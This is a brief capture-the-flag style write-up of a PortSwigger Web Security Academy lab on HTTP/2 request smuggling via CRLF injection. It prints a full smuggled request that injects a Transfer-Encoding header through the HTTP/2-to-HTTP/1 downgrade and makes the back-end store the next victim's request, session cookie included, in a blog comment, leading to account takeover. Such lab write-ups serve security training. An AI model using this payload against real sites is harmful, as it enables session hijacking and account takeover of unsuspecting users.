# [HTTP/2 request smuggling via CRLF injection] — [PortSwigger] — [Practitioner]
**Date:** 2026-06-26
 
---
 
## Vulnerability / core concept
HTTP Request Smuggling

---


## Payload / key command
In this lab we need to inject `\r\n` into header so when HTTP/2 front-end downgrades this request to HTTP/1, our `Transfer-Encoding` header gets injected and executed by back-end:
```bash
POST / HTTP/2
Host: 0a92006b03fa287d81de98ad003e00f0.web-security-academy.net
Cookie: session=u6P7sEWgb3BFw2A7pOQUxoKVLUYGSo3e; _lab_analytics=W7SlUzoIL3F886mZBqT5U2EOMaGNeWanwr4HNryF5HWYvOCpUKnQE2K8bPlvOtndEckldsvKm8nnJqeAos6cYn7DB7ymssBaoLYqeEjQSp4nnaNiSb3SCNqYAsr12f3ijY6z4pQo9axY3d86d4QEn7EzaVou6SMNh6ReWbIwb3xnlya1bnJNNvY1mcanfSM40yBDTD9MkZTcta0tTOa8ydnrBiy3uuGJvh80au9Q4eP6NFG1csmuv0ALcQ6F0VUK
Foo: x\r\nTransfer-Encoding: chunked
0

POST /post/comment HTTP/1.1
Host: 0a92006b03fa287d81de98ad003e00f0.web-security-academy.net
Cookie: session=u6P7sEWgb3BFw2A7pOQUxoKVLUYGSo3e; _lab_analytics=W7SlUzoIL3F886mZBqT5U2EOMaGNeWanwr4HNryF5HWYvOCpUKnQE2K8bPlvOtndEckldsvKm8nnJqeAos6cYn7DB7ymssBaoLYqeEjQSp4nnaNiSb3SCNqYAsr12f3ijY6z4pQo9axY3d86d4QEn7EzaVou6SMNh6ReWbIwb3xnlya1bnJNNvY1mcanfSM40yBDTD9MkZTcta0tTOa8ydnrBiy3uuGJvh80au9Q4eP6NFG1csmuv0ALcQ6F0VUK
Content-Length: 1000

csrf=R0a3CMgJRwQ5nobpGUGElbAekDF9zoIa&postId=3&name=babek&email=babek@babek&website=http://babek.com&comment=
```
This request posts the request of the victim in comment section and reveals us his session cookie that lets us perform account takeover.

Note: When we are editing the header through Inspector to add `\r\n` into header using Shift+Enter, Burp suite will not show us the top request and say that header cannot contain newline. We can ignore it and still send the request to exploit victim.

